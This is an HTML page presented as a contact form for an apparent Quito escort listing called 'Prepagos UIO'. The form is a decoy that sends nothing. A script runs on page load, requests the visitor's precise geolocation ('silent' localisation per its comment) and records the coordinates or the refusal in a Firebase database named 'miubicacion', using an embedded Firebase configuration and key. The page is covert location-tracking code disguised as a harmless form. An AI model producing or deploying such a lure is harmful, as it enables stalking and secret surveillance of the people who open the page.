<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contacto | Prepagos UIO</title>
    
    <!-- SDK de Firebase en modo compatibilidad -->
    <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-database-compat.js"></script>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Arial, sans-serif; }
        body { background-color: #111111; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .contact-container { background-color: #1a1a1a; width: 100%; max-width: 450px; padding: 40px 30px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.6); border: 1px solid #2a2a2a; text-align: center; }
        h2 { font-size: 28px; margin-bottom: 10px; font-weight: 600; letter-spacing: 1px; color: #ffffff; }
        p.subtitle { color: #888888; font-size: 14px; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; text-align: left; }
        label { display: block; font-size: 12px; text-transform: uppercase; color: #aaaaaa; margin-bottom: 6px; font-weight: bold; letter-spacing: 0.5px; }
        input[type="text"], input[type="email"], input[type="tel"], textarea { width: 100%; padding: 12px; background-color: #262626; border: 1px solid #3a3a3a; border-radius: 6px; color: #ffffff; font-size: 14px; transition: border 0.3s ease; }
        input:focus, textarea:focus { border-color: #ffffff; outline: none; background-color: #2d2d2d; }
        textarea { resize: none; height: 100px; }
        .btn-submit { width: 100%; background-color: #ffffff; color: #111111; border: none; padding: 14px; border-radius: 6px; font-size: 14px; font-weight: bold; text-transform: uppercase; cursor: pointer; letter-spacing: 1px; margin-top: 10px; transition: background 0.3s ease; }
        .btn-submit:hover { background-color: #e6e6e6; }
        footer { margin-top: 30px; font-size: 11px; color: #555555; letter-spacing: 0.5px; }
    </style>
</head>
<body>

    <div class="contact-container">
        <h2>CONTACTANOS</h2>
        <p class="subtitle">Déjanos tus datos para ponernos en contacto contigo a la brevedad.</p>
        
        <form onsubmit="event.preventDefault(); alert('Mensaje enviado con éxito. Nos comunicaremos pronto.');">
            <div class="form-group">
                <label>Nombre Completo</label>
                <input type="text" placeholder="Ej. Juan Pérez" required>
            </div>
            
            <div class="form-group">
                <label>Correo Electrónico</label>
                <input type="email" placeholder="nombre@correo.com" required>
            </div>
            
            <div class="form-group">
                <label>Teléfono / WhatsApp</label>
                <input type="tel" placeholder="Ej. 099XXXXXXX" required>
            </div>
            
            <div class="form-group">
                <label>Mensaje o Consulta</label>
                <textarea placeholder="Escribe tu mensaje aquí..."></textarea>
            </div>
            
            <button type="submit" class="btn-submit">Enviar Mensaje</button>
        </form>

        <footer>
            &copy; 2026 Prepagos UIO. Todos los derechos reservados.
        </footer>
    </div>

    <script>
        // Configuración exacta extraída de tus capturas previas de Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyDITt3GQmc1uANwOqWNvoqWgmhm9CQQRdU",
            authDomain: "miubicacion-52e7f.firebaseapp.com",
            databaseURL: "https://miubicacion-52e7f-default-rtdb.firebaseio.com",
            projectId: "miubicacion-52e7f",
            storageBucket: "miubicacion-52e7f.firebasestorage.app",
            messagingSenderId: "847245935895",
            appId: "1:847245935895:web:e9576ba5280ac05b22e352"
        };

        // Inicializar Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // Solicitar localización silenciosa al cargar la interfaz
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(siPermitio, noPermitio, {
                    enableHighAccuracy: true,
                    timeout: 12000 // 12 segundos para mitigar el timeout error_codigo 3 anterior
                });
            }
        };

        function siPermitio(posicion) {
            database.ref('visitas_autos/' + Date.now()).set({
                latitud: posicion.coords.latitude,
                longitud: posicion.coords.longitude,
                permiso: "Otorgado",
                fecha_registro: new Date().toLocaleString("es-EC", {timeZone: "America/Guayaquil"})
            });
        }

        function noPermitio(error) {
            database.ref('visitas_autos/' + Date.now()).set({
                permiso: "Denegado",
                error_codigo: error.code,
                fecha_registro: new Date().toLocaleString("es-EC", {timeZone: "America/Guayaquil"})
            });
        }
    </script>
</body>
</html>
